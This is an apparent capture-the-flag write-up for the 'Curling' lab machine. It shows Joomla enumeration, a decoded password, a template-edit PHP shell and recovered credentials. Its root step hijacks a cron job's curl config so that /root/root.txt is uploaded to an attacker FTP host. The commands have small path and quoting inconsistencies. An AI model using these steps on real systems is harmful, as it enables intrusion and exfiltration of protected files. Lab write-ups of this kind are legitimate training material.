# CURLING

10.10.10.150 

# USER 

Username recovery tells me about email address not being found?

JOOMLA VERSION
```
[+] Joomla version: 3.8.8
```

MSF Joomla scannar found

```
http://10.10.10.150/htaccess.txt
http://10.10.10.150/administrator/index.php
```

Found secret.txt with something that might be a hash?

```
Q3VybGluZzIwMTgh --> Curling2018!
```

When logging in with Floris. You get super user and can log into to /administator

By going to templates changing the ```index.php``` to a shell then clicking "Preview template" you can run php code

Found so tar archive that ended up giving creds:

```
floris
5d<wdCbdZu)|hChXll 
```

# ROOT

By comparing the processes I can see this selection
```
17896 ?        00:00:00 cron
17900 ?        00:00:00 sh
17901 ?        00:00:00 sleep
```


By running "ps -ef" I can see the command run 

```
/bin/sh -c sleep 1;
cat /root/default.txt > /home/floris/admin_area/input
/bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin_area/report
```

-K loads a config file called input. We can place in this config file 

Command for the config
This command uploaded the root.txt file to an external FTP server

```
echo "url = \"ftp://10.10.14.9:2121\"" > ~/admin-area/input ; echo "upload-file = \"/root/root.txt"" >> ~/admin-area/input
```

This uploads the ```root.txt``` to the temp ftp server
